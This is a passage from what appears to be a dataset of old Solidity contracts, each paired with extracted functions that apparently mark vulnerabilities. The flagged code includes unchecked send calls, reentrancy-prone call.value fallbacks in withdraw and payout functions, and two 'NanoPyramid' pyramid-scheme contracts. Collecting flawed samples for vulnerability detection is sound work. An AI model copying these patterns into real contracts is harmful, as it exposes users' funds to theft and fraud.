= now;\n }\n function setOwner(address _owner) onlyowner {\n owner = _owner;\n }\n}",
  "extract_feature": [
    "function __callback(bytes32 oraclizeId, string result) {\nif (msg.sender != oraclize_cbAddress()) throw;\nuint _exchangeRate = parseInt(result, 6) * 100;\nif (_exchangeRate > 0) {\nexchangeRate = _exchangeRate;\n}\nuint id = oraclizeRequests[oraclizeId];\nif (id == 0) return;\naddress sender = tasks[id].sender;\naddress callback = tasks[id].callback;\nif (tasks[id].toKissBTC) {\nuint freshKissBTC = inKissBTC(tasks[id].value);\ntotalSupply += freshKissBTC;\nbalances[sender] += freshKissBTC;\nTransfer(address(this), sender, freshKissBTC);\nif (callback != 0) {\nKissBTCCallback(callback).kissBTCCallback.\nvalue(0)(id, freshKissBTC);\n}\n} else {\nuint releasedEther = inEther(tasks[id].value);\nsender.send(releasedEther);\nif (callback != 0) {\nKissBTCCallback(callback).kissBTCCallback.\nvalue(0)(id, releasedEther);\n}\n}\ndelete oraclizeRequests[oraclizeId];\ndelete tasks[id];\n}",
    "function toldYouItWouldWork() onlyowner {\nif (now - timestamp < 24 hours) throw;\nuint obligations = inEther(totalSupply);\nif (this.balance <= obligations * 3) throw;\nuint excess = this.balance - (obligations * 3);\nuint payment = excess / 100;\nif (payment > 0) owner.send(payment);\ntimestamp = now;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1642"
  },
  "filename": "40482.sol",
  "content": "contract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n address oraclizeAddr = OAR.getAddress();\n if (oraclizeAddr == 0){\n oraclize_setNetwork(networkID_auto);\n oraclizeAddr = OAR.getAddress();\n }\n oraclize = OraclizeI(oraclizeAddr);\n _\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed);\n return true;\n }\n if (getCodeSize(0x9efbea6358bed926b293d2ce63a730d6d98d43dd)>0){\n OAR = OraclizeAddrResolverI(0x9efbea6358bed926b293d2ce63a730d6d98d43dd);\n return true;\n }\n if (getCodeSize(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf)>0){\n OAR = OraclizeAddrResolverI(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf);\n return true;\n }\n return false;\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int)\n {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string){\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n mint *= 10 ** _b;\n return mint;\n }\n}\ncontract TokenInterface {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _amount) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _amount) returns (bool success);\n function approve(address _spender, uint256 _amount) returns (bool success);\n function allowance(\n address _owner,\n address _spender\n ) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _amount\n );\n}\ncontract Token is TokenInterface {\n modifier noEther() {if (msg.value > 0) throw; _}\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function _transfer(address _to, uint256 _amount) internal returns (bool success) {\n if (balances[msg.sender] >= _amount && _amount > 0) {\n balances[msg.sender] -= _amount;\n balances[_to] += _amount;\n Transfer(msg.sender, _to, _amount);\n return true;\n } else {\n return false;\n }\n }\n function _transferFrom(\n address _from,\n address _to,\n uint256 _amount\n ) internal returns (bool success) {\n if (balances[_from] >= _amount\n && allowed[_from][msg.sender] >= _amount\n && _amount > 0) {\n balances[_to] += _amount;\n balances[_from] -= _amount;\n allowed[_from][msg.sender] -= _amount;\n Transfer(_from, _to, _amount);\n return true;\n } else {\n return false;\n }\n }\n function approve(address _spender, uint256 _amount) returns (bool success) {\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract KissBTCCallback {\n function kissBTCCallback(uint id, uint amount);\n}\ncontract ApprovalRecipient {\n function receiveApproval(address _from, uint256 _amount,\n address _tokenContract, bytes _extraData);\n}\ncontract KissBTC is usingOraclize, Token {\n string constant PRICE_FEED =\n \"json(https:\n uint constant MAX_AMOUNT =\n 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n uint constant MAX_ETH_VALUE = 10 ether;\n uint constant MIN_ETH_VALUE = 50 finney;\n uint constant MAX_KISS_BTC_VALUE = 25000000;\n uint constant MIN_KISS_BTC_VALUE = 125000;\n uint constant DEFAULT_GAS_LIMIT = 200000;\n string public standard = \"Token 0.1\";\n string public name = \"kissBTC\";\n string public symbol = \"kissBTC\";\n uint8 public decimals = 8;\n struct Task {\n bytes32 oraclizeId;\n bool toKissBTC;\n address sender;\n uint value;\n address callback;\n uint timestamp;\n }\n mapping (uint => Task) public tasks;\n mapping (bytes32 => uint) public oraclizeRequests;\n uint public exchangeRate;\n uint public nextId = 1;\n address public owner;\n uint public timestamp;\n modifier onlyowner { if (msg.sender == owner) _ }\n function KissBTC() {\n owner = msg.sender;\n }\n function () {\n buyKissBTCWithCallback(0, DEFAULT_GAS_LIMIT);\n }\n function buyKissBTC() {\n buyKissBTCWithCallback(0, DEFAULT_GAS_LIMIT);\n }\n function buyKissBTCWithCallback(address callback,\n uint gasLimit) oraclizeAPI\n returns (uint id) {\n if (msg.value < MIN_ETH_VALUE || msg.value > MAX_ETH_VALUE) throw;\n if (gasLimit < DEFAULT_GAS_LIMIT) gasLimit = DEFAULT_GAS_LIMIT;\n uint oraclizePrice = oraclize.getPrice(\"URL\", gasLimit);\n uint fee = msg.value / 100;\n if (msg.value <= oraclizePrice + fee) throw;\n uint value = msg.value - (oraclizePrice + fee);\n id = nextId++;\n bytes32 oraclizeId = oraclize.query_withGasLimit.value(oraclizePrice)(\n 0,\n \"URL\",\n PRICE_FEED,\n gasLimit\n );\n tasks[id].oraclizeId = oraclizeId;\n tasks[id].toKissBTC = true;\n tasks[id].sender = msg.sender;\n tasks[id].value = value;\n tasks[id].callback = callback;\n tasks[id].timestamp = now;\n oraclizeRequests[oraclizeId] = id;\n }\n function transfer(address _to,\n uint256 _amount) noEther returns (bool success) {\n if (_to == address(this)) {\n sellKissBTCWithCallback(_amount, 0, DEFAULT_GAS_LIMIT);\n return true;\n } else {\n return _transfer(_to, _amount);\n }\n }\n function transferFrom(address _from,\n address _to,\n uint256 _amount) noEther returns (bool success) {\n if (_to == address(this)) throw;\n return _transferFrom(_from, _to, _amount);\n }\n function sellKissBTC(uint256 _amount) returns (uint id) {\n return sellKissBTCWithCallback(_amount, 0, DEFAULT_GAS_LIMIT);\n }\n function sellKissBTCWithCallback(uint256 _amount,\n address callback,\n uint gasLimit) oraclizeAPI\n returns (uint id) {\n if (_amount < MIN_KISS_BTC_VALUE\n || _amount > MAX_KISS_BTC_VALUE) throw;\n if (balances[msg.sender] < _amount) throw;\n if (gasLimit < DEFAULT_GAS_LIMIT) gasLimit = DEFAULT_GAS_LIMIT;\n if (!safeToSell(_amount)) throw;\n uint oraclizePrice = oraclize.getPrice(\"URL\", gasLimit);\n uint oraclizePriceKissBTC = inKissBTC(oraclizePrice);\n uint fee = _amount / 100;\n if (_amount <= oraclizePriceKissBTC + fee) throw;\n uint value = _amount - (oraclizePriceKissBTC + fee);\n balances[msg.sender] -= _amount;\n totalSupply -= _amount;\n Transfer(msg.sender, address(this), _amount);\n id = nextId++;\n bytes32 oraclizeId = oraclize.query_withGasLimit.value(oraclizePrice)(\n 0,\n \"URL\",\n PRICE_FEED,\n gasLimit\n );\n tasks[id].oraclizeId = oraclizeId;\n tasks[id].toKissBTC = false;\n tasks[id].sender = msg.sender;\n tasks[id].value = value;\n tasks[id].callback = callback;\n tasks[id].timestamp = now;\n oraclizeRequests[oraclizeId] = id;\n }\n function inKissBTC(uint amount) constant returns (uint) {\n return (amount * exchangeRate) / 1000000000000000000;\n }\n function inEther(uint amount) constant returns (uint) {\n return (amount * 1000000000000000000) / exchangeRate;\n }\n function safeToSell(uint amount) constant returns (bool) {\n return inEther(amount) * 125 < this.balance * 100;\n }\n function __callback(bytes32 oraclizeId, string result) {\n if (msg.sender != oraclize_cbAddress()) throw;\n uint _exchangeRate = parseInt(result, 6) * 100;\n if (_exchangeRate > 0) {\n exchangeRate = _exchangeRate;\n }\n uint id = oraclizeRequests[oraclizeId];\n if (id == 0) return;\n address sender = tasks[id].sender;\n address callback = tasks[id].callback;\n if (tasks[id].toKissBTC) {\n uint freshKissBTC = inKissBTC(tasks[id].value);\n totalSupply += freshKissBTC;\n balances[sender] += freshKissBTC;\n Transfer(address(this), sender, freshKissBTC);\n if (callback != 0) {\n KissBTCCallback(callback).kissBTCCallback.\n value(0)(id, freshKissBTC);\n }\n } else {\n uint releasedEther = inEther(tasks[id].value);\n sender.send(releasedEther);\n if (callback != 0) {\n KissBTCCallback(callback).kissBTCCallback.\n value(0)(id, releasedEther);\n }\n }\n delete oraclizeRequests[oraclizeId];\n delete tasks[id];\n }\n function retryOraclizeRequest(uint id) oraclizeAPI {\n if (tasks[id].oraclizeId == 0) throw;\n uint timePassed = now - tasks[id].timestamp;\n if (timePassed < 60 minutes) throw;\n uint price = oraclize.getPrice(\"URL\", DEFAULT_GAS_LIMIT);\n bytes32 newOraclizeId = oraclize.query_withGasLimit.value(price)(\n 0,\n \"URL\",\n PRICE_FEED,\n DEFAULT_GAS_LIMIT\n );\n delete oraclizeRequests[tasks[id].oraclizeId];\n tasks[id].oraclizeId = newOraclizeId;\n tasks[id].callback = 0;\n tasks[id].timestamp = now;\n oraclizeRequests[newOraclizeId] = id;\n }\n function whitelist(address _spender) returns (bool success) {\n return approve(_spender, MAX_AMOUNT);\n }\n function approveAndCall(address _spender,\n uint256 _amount,\n bytes _extraData) returns (bool success) {\n approve(_spender, _amount);\n ApprovalRecipient(_spender).receiveApproval.\n value(0)(msg.sender, _amount, this, _extraData);\n return true;\n }\n function donate() {\n }\n function toldYouItWouldWork() onlyowner {\n if (now - timestamp < 24 hours) throw;\n uint obligations = inEther(totalSupply);\n if (this.balance <= obligations * 3) throw;\n uint excess = this.balance - (obligations * 3);\n uint payment = excess / 100;\n if (payment > 0) owner.send(payment);\n timestamp = now;\n }\n function setOwner(address _owner) onlyowner {\n owner = _owner;\n }\n}",
  "extract_feature": [
    "function __callback(bytes32 oraclizeId, string result) {\nif (msg.sender != oraclize_cbAddress()) throw;\nuint _exchangeRate = parseInt(result, 6) * 100;\nif (_exchangeRate > 0) {\nexchangeRate = _exchangeRate;\n}\nuint id = oraclizeRequests[oraclizeId];\nif (id == 0) return;\naddress sender = tasks[id].sender;\naddress callback = tasks[id].callback;\nif (tasks[id].toKissBTC) {\nuint freshKissBTC = inKissBTC(tasks[id].value);\ntotalSupply += freshKissBTC;\nbalances[sender] += freshKissBTC;\nTransfer(address(this), sender, freshKissBTC);\nif (callback != 0) {\nKissBTCCallback(callback).kissBTCCallback.\nvalue(0)(id, freshKissBTC);\n}\n} else {\nuint releasedEther = inEther(tasks[id].value);\nsender.send(releasedEther);\nif (callback != 0) {\nKissBTCCallback(callback).kissBTCCallback.\nvalue(0)(id, releasedEther);\n}\n}\ndelete oraclizeRequests[oraclizeId];\ndelete tasks[id];\n}",
    "function toldYouItWouldWork() onlyowner {\nif (now - timestamp < 24 hours) throw;\nuint obligations = inEther(totalSupply);\nif (this.balance <= obligations * 3) throw;\nuint excess = this.balance - (obligations * 3);\nuint payment = excess / 100;\nif (payment > 0) owner.send(payment);\ntimestamp = now;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1643"
  },
  "filename": "40561.sol",
  "content": "contract tokenRecipient {\n function receiveApproval(address _from, uint256 _value, address _token);\n}\ncontract Token {\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n function totalSupply() constant returns (uint256 supply);\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function approveAndCall(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n}\ncontract SafeAddSub {\n function safeToAdd(uint a, uint b) internal returns (bool) {\n return (a + b > a);\n }\n function safeToSubtract(uint a, uint b) internal returns (bool) {\n return (a >= b);\n }\n function safeAdd(uint a, uint b) internal returns (uint256) {\n if (!safeToAdd(a, b)) throw;\n return a + b;\n }\n function safeSubtract(uint a, uint b) internal returns (uint256) {\n if (!safeToSubtract(a, b)) throw;\n return a - b;\n }\n}\ncontract EthToken is Token, SafeAddSub {\n string public constant name = \"Ether Token Proxy\";\n string public constant symbol = \"ETH\";\n uint8 public constant decimals = 18;\n uint256 public constant baseUnit = 10**18;\n mapping (address => uint256) _balanceOf;\n mapping (address => mapping (address => uint256)) _allowance;\n event Deposit(address indexed owner, uint256 amount);\n event Withdrawal(address indexed owner, uint256 amount);\n function totalSupply() constant returns (uint256 supply) {\n return this.balance;\n }\n function () {\n deposit();\n }\n function deposit() {\n _balanceOf[msg.sender] = safeAdd(_balanceOf[msg.sender], msg.value);\n Deposit(msg.sender, msg.value);\n }\n function redeem() {\n withdraw(_balanceOf[msg.sender]);\n }\n function withdraw(uint256 _value) returns (bool success) {\n _balanceOf[msg.sender] = safeSubtract(_balanceOf[msg.sender], _value);\n if (!msg.sender.send(_value)) {\n if (!msg.sender.call.gas(msg.gas).value(_value)()) throw;\n }\n Withdrawal(msg.sender, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return _balanceOf[_owner];\n }\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (_to == address(this) || _to == 0) {\n return withdraw(_value);\n } else {\n _balanceOf[msg.sender] = safeSubtract(_balanceOf[msg.sender], _value);\n _balanceOf[_to] = safeAdd(_balanceOf[_to], _value);\n Transfer(msg.sender, _to, _value);\n }\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (!safeToSubtract(_allowance[_from][msg.sender], _value)) throw;\n if (_to == address(this) || _to == 0) {\n if (!transferFrom(_from, msg.sender, _value)) throw;\n withdraw(_value);\n } else {\n _balanceOf[_from] = safeSubtract(_balanceOf[_from], _value);\n _balanceOf[_to] = safeAdd(_balanceOf[_to], _value);\n _allowance[_from][msg.sender] = safeSubtract(_allowance[_from][msg.sender], _value);\n Transfer(_from, _to, _value);\n }\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n _allowance[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function approveAndCall(address _spender, uint256 _value) returns (bool success) {\n if (approve(_spender, _value)) {\n tokenRecipient(_spender).receiveApproval(msg.sender, _value, this);\n return true;\n }\n throw;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return _allowance[_owner][_spender];\n }\n}",
  "extract_feature": [
    "function withdraw(uint256 _value) returns (bool success) {\n_balanceOf[msg.sender] = safeSubtract(_balanceOf[msg.sender], _value);\nif (!msg.sender.send(_value)) {\nif (!msg.sender.call.gas(msg.gas).value(_value)()) throw;\n}\nWithdrawal(msg.sender, _value);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1644"
  },
  "filename": "40578.sol",
  "content": "contract NanoPyramid {\n uint private pyramidMultiplier = 140;\n uint private minAmount = 1 finney;\n uint private maxAmount = 1 ether;\n uint private fee = 1;\n uint private collectedFees = 0;\n uint private minFeePayout = 100 finney;\n address private owner;\n function NanoPyramid() {\n owner = msg.sender;\n }\n modifier onlyowner { if (msg.sender == owner) _ }\n struct Participant {\n address etherAddress;\n uint payout;\n }\n Participant[] public participants;\n uint public payoutOrder = 0;\n uint public balance = 0;\n function() {\n enter();\n }\n function enter() {\n if (msg.value < minAmount) {\n collectedFees += msg.value;\n return;\n }\n uint amount;\n if (msg.value > maxAmount) {\n uint amountToRefund = msg.value - maxAmount;\n if (amountToRefund >= minAmount) {\n if (!msg.sender.send(amountToRefund)) {\n throw;\n }\n }\n amount = maxAmount;\n } else {\n amount = msg.value;\n }\n participants.push(Participant(\n msg.sender,\n amount * pyramidMultiplier / 100\n ));\n balance += (amount * (100 - fee)) / 100;\n collectedFees += (amount * fee) / 100;\n while (balance > participants[payoutOrder].payout) {\n uint payoutToSend = participants[payoutOrder].payout;\n participants[payoutOrder].etherAddress.send(payoutToSend);\n balance -= payoutToSend;\n payoutOrder += 1;\n }\n if (collectedFees >= minFeePayout) {\n if (!owner.send(collectedFees)) {\n if (owner.call.gas(msg.gas).value(collectedFees)()) {\n collectedFees = 0;\n }\n } else {\n collectedFees = 0;\n }\n }\n }\n function totalParticipants() constant returns (uint count) {\n count = participants.length;\n }\n function awaitingParticipants() constant returns (uint count) {\n count = participants.length - payoutOrder;\n }\n function outstandingBalance() constant returns (uint amount) {\n uint payout = 0;\n uint idx;\n for (idx = payoutOrder; idx < participants.length; idx++) {\n payout += participants[idx].payout;\n }\n amount = payout - balance;\n }\n function setOwner(address _owner) onlyowner {\n owner = _owner;\n }\n}",
  "extract_feature": [
    "function enter() {\nif (msg.value < minAmount) {\ncollectedFees += msg.value;\nreturn;\n}\nuint amount;\nif (msg.value > maxAmount) {\nuint amountToRefund = msg.value - maxAmount;\nif (amountToRefund >= minAmount) {\nif (!msg.sender.send(amountToRefund)) {\nthrow;\n}\n}\namount = maxAmount;\n} else {\namount = msg.value;\n}\nparticipants.push(Participant(\nmsg.sender,\namount * pyramidMultiplier / 100\n));\nbalance += (amount * (100 - fee)) / 100;\ncollectedFees += (amount * fee) / 100;\nwhile (balance > participants[payoutOrder].payout) {\nuint payoutToSend = participants[payoutOrder].payout;\nparticipants[payoutOrder].etherAddress.send(payoutToSend);\nbalance -= payoutToSend;\npayoutOrder += 1;\n}\nif (collectedFees >= minFeePayout) {\nif (!owner.send(collectedFees)) {\nif (owner.call.gas(msg.gas).value(collectedFees)()) {\ncollectedFees = 0;\n}\n} else {\ncollectedFees = 0;\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1645"
  },
  "filename": "40589.sol",
  "content": "contract owned {\n function owned() {\n owner = msg.sender;\n }\n address public owner;\n modifier onlyowner { if (msg.sender != owner) throw; _ }\n event OwnershipTransfer(address indexed from, address indexed to);\n function transferOwnership(address to) public onlyowner {\n owner = to;\n OwnershipTransfer(msg.sender, to);\n }\n}\ncontract ERC20 {\n function totalSupply() constant returns (uint supply);\n function balanceOf(address who) constant returns (uint value);\n function allowance(address owner, address spender) constant returns (uint _allowance);\n function transfer(address to, uint value) returns (bool ok);\n function transferFrom(address from, address to, uint value) returns (bool ok);\n function approve(address spender, uint value) returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\ncontract Order is owned {\n ERC20 public token;\n uint public weiPerToken;\n uint public decimalPlaces;\n function Order(address _token, uint _weiPerToken, uint _decimalPlaces) {\n token = ERC20(_token);\n weiPerToken = _weiPerToken;\n decimalPlaces = _decimalPlaces;\n }\n function sendRobust(address to, uint value) internal {\n if (!to.send(value)) {\n if (!to.call.value(value)()) throw;\n }\n }\n function min(uint a, uint b) internal returns (uint) {\n if (a <= b) {\n return a;\n } else {\n return b;\n }\n }\n function getTransferableBalance(address who) internal returns (uint amount) {\n uint allowance = token.allowance(msg.sender, address(this));\n uint balance = token.balanceOf(msg.sender);\n amount = min(min(allowance, balance), numTokensAbleToPurchase());\n return amount;\n }\n function numTokensAbleToPurchase() constant returns (uint) {\n return (this.balance / weiPerToken) * decimalPlaces;\n }\n event OrderFilled(address _from, uint numTokens);\n function _fillOrder(address _from, uint numTokens) internal returns (bool) {\n if (numTokens == 0) throw;\n if (this.balance < numTokens * weiPerToken / decimalPlaces) throw;\n if (!token.transferFrom(_from, owner, numTokens)) return false;\n sendRobust(_from, numTokens * weiPerToken / decimalPlaces);\n OrderFilled(_from, numTokens);\n return true;\n }\n function fillOrder(address _from, uint numTokens) public returns (bool) {\n return _fillOrder(_from, numTokens);\n }\n function fillMyOrder(uint numTokens) public returns (bool) {\n return _fillOrder(msg.sender, numTokens);\n }\n function fillTheirOrder(address who) public returns (bool) {\n return _fillOrder(who, getTransferableBalance(who));\n }\n function fillOrderAuto() public returns (bool) {\n return _fillOrder(msg.sender, getTransferableBalance(msg.sender));\n }\n function () {\n if (msg.value > 0) {\n return;\n } else {\n fillOrderAuto();\n }\n }\n function cancel() onlyowner {\n selfdestruct(owner);\n }\n}",
  "extract_feature": [
    "function sendRobust(address to, uint value) internal {\nif (!to.send(value)) {\nif (!to.call.value(value)()) throw;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1646"
  },
  "filename": "40591.sol",
  "content": "contract one {\n address public deployer;\n address public targetAddress;\n modifier execute {\n if (msg.sender == deployer) {\n _\n }\n }\n function one() {\n deployer = msg.sender;\n targetAddress = 0x6a92b2804EaeF97f222d003C94F683333e330693;\n }\n function forward() {\n targetAddress.call.gas(200000).value(this.balance)();\n }\n function() {\n forward();\n }\n function sendBack() execute {\n deployer.send(this.balance);\n }\n}",
  "extract_feature": [
    "function sendBack() execute {\ndeployer.send(this.balance);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1647"
  },
  "filename": "40618.sol",
  "content": "contract NanoPyramid {\n uint private pyramidMultiplier = 140;\n uint private minAmount = 1 finney;\n uint private maxAmount = 1 ether;\n uint private fee = 2;\n uint private collectedFees = 0;\n uint private minFeePayout = 100 finney;\n address private owner;\n function NanoPyramid() {\n owner = msg.sender;\n }\n modifier onlyowner { if (msg.sender == owner) _ }\n struct Participant {\n address etherAddress;\n uint payout;\n }\n Participant[] public participants;\n uint public payoutOrder = 0;\n uint public balance = 0;\n function() {\n enter();\n }\n function enter() {\n if (msg.value < minAmount) {\n collectedFees += msg.value;\n return;\n }\n uint amount;\n if (msg.value > maxAmount) {\n uint amountToRefund = msg.value - maxAmount;\n if (amountToRefund >= minAmount) {\n if (!msg.sender.send(amountToRefund)) {\n throw;\n }\n }\n amount = maxAmount;\n }\n else {\n amount = msg.value;\n }\n participants.push(Participant(\n msg.sender,\n amount * pyramidMultiplier / 100\n ));\n balance += (amount * (100 - fee)) / 100;\n collectedFees += (amount * fee) / 100;\n while (balance > participants[payoutOrder].payout) {\n uint payoutToSend = participants[payoutOrder].payout;\n participants[payoutOrder].etherAddress.send(payoutToSend);\n balance -= payoutToSend;\n payoutOrder += 1;\n }\n if (collectedFees >= minFeePayout) {\n if (!owner.send(collectedFees)) {\n if (owner.call.gas(msg.gas).value(collectedFees)()) {\n collectedFees = 0;\n }\n } else 